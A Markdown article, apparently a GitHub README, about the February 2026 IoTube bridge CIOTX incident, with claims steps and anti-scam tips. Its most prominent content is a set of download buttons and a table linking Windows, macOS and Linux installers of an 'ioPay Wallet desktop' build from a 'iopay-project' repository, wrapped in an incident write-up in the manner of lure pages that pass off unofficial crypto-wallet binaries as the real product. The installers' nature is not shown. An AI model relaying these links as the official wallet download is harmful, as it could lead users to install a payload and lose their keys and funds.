![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# The IoTube Incident: What It Changed and What to Do If a Transfer Was Affected

On **21 February 2026**, unauthorised **CIOTX minting** disrupted the IoTube bridge. IoTeX opened a **claims portal on 2 March 2026** and reported that payouts had started, and governance passed **IIP-56** to retire CIOTX.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

Those are the facts of the event, and they are the whole of what this page will assert about it. If your question is "was I affected?" the answer depends on which token you moved and when - not on the wallet you moved it from.

## What actually happened

IoTube is the bridge into and out of IoTeX. CIOTX is the **cross-chain representation** of IOTX that the bridge issues on other chains - not native IOTX, and not the same asset as wrapped IOTX.

In February 2026, CIOTX was minted without authorisation. That is a bridge and token event: the failure was in the mechanism that issues the representation, not in a desktop wallet, and not in the IoTeX chain itself. If you were holding, sending or receiving CIOTX across chains in that window, your transfer could have been affected. If you were staking native IOTX, or holding IOTX in a wallet, it was not.

## If a transfer was never credited

Take these in order, and **do not re-send the transfer to "fix" it**. A duplicate send is a second transaction with its own outcome, and it will not retrieve the first.

**1. Check the destination chain and address format.** IoTeX addresses exist in `io1...` and `0x...` forms, and both belong to the same account - but each chain expects its own format. A transfer credited to the wrong chain, or sent to an address format the destination does not use, looks "missing" while sitting exactly where it was sent. [The bridge guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-use-the-iotube-bridge-in-iopay-wallet.md) covers the address side of this properly.

**2. Establish the date.** If the transaction was submitted before the current bridge behaviour and around the February-March 2026 window, the [claims route named in IoTeX's incident review](https://iotex.io/blog/how-iotex-responded-to-the-iotube-bridge-incident-a-full-month-in-review) is the correct place to look. If it was submitted after that, this is almost certainly an ordinary bridge error, not the incident - start with [fixing IoTube swap errors](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/fixing-iotube-swap-errors-in-iopay.md).

**3. Check the status tracker.** The wallet shows a status for each bridge transfer. "Pending" and "failed" are different states; read which one you have before doing anything.

**4. Stop if it is mined.** Once a transfer is mined on the source chain, no wallet, no support channel and no bridge operator can reverse it by request. What can happen is a credit on the destination side, a claim, or nothing.

## What the incident changed

**CIOTX is retired.** IIP-56 set the retirement in motion, so any guide that tells you to bridge by acquiring CIOTX is describing a mechanism that no longer exists in that form. If you are following an older tutorial, that is where it will fail.

**Claims, not compensation by announcement.** A claims portal and reported payouts are the documented route. This page does not claim that every affected user was paid, that every claim was approved, or that anyone is owed a specific amount. Those are determinations for the claims process, not for an article.

**The bridge is not "fixed" in the sense of "never fails again".** No bridge is. What is true is that the unauthorised minting vector that caused this event was addressed, and that the token it exploited is being retired.

## What to do now, in practice

- **Use the current build.** v2.0.2 is the release this page describes; an old build may still be pointing at mechanisms that were retired. [Update guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/updating-iopay-wallet-to-the-latest-version.md).
- **Know which IOTX you hold.** Four things carry the name - native, legacy ERC-20, wrapped and the retired CIOTX - and they are not interchangeable. Confusing them is the root of most bridge support threads, so [the four variants sit side by side](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md) on one page.
- **Fund gas on both sides.** A bridge transfer needs gas on the destination chain to complete the credit. A transfer that arrives with an empty destination account can look stuck.
- **Do not bridge to "test" a large amount.** Send a small amount first, confirm it credits, then send the rest.
- **Do not trust a "recovery" offer.** Anyone who says they can reverse a bridge transaction for a fee is asking for your keys.

## The honest limits of this page

This is a dated factual account of an event, written from IoTeX's published review and the IIP that retired CIOTX. It does not describe individual cases, does not estimate how many users were affected, and does not promise an outcome for any transfer.

If your transfer was affected, the claims route is the only path that can tell you anything about your specific case. If it was not, [the bridge guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-use-the-iotube-bridge-in-iopay-wallet.md) is where a normal transfer starts - and [the slippage and swap settings page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-wallet-token-swap-slippage-settings.md) covers the in-wallet swap, which is a different mechanism from the bridge and was not part of this event.

If the wallet cannot reach the network at all, that is unrelated and has its own fix: [network errors](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md).

## What a claim asks for, and what it never asks for

A claims process needs evidence: the transaction hash, the address that sent and the address that should have received, the date, and the asset involved. Keep those in one place before you start, and take them from an explorer rather than from memory.

It never needs the phrase, the private key or a keystore file, and no legitimate process asks for a password. An offer that requires any of those is not a claim, whatever page it appears on. If a form asks for something that would let its owner sign, close it and report the transfer through the channel the review names.
